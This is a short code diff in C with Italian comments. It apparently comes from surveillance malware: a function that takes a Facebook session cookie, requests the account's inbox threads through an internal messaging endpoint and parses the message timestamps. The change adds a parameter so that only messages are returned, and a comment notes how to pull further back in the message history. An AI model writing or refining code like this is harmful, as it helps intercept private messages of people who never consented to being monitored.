@@ -254,7 +254,7 @@ DWORD HandleFBMessages(char *cookie)
 		urldecode((char *)parser1);
 		// Se voglio andare piu' indietro aggiungo alla richiesta...per ora pero' va bene cosi'
 		// &thread_offset=0&num_msgs=60
-		_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/ajax/messaging/async.php?sk=inbox&action=read&tid=%S&__a=1", parser1);
+		_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/ajax/messaging/async.php?sk=inbox&action=read&tid=%S&__a=1&msgs_only=1", parser1);
 		parser1 = parser2 + 1;
 
 		parser1 = (BYTE *)strstr((char *)parser1, FB_MESSAGE_TSTAMP_IDENTIFIER);
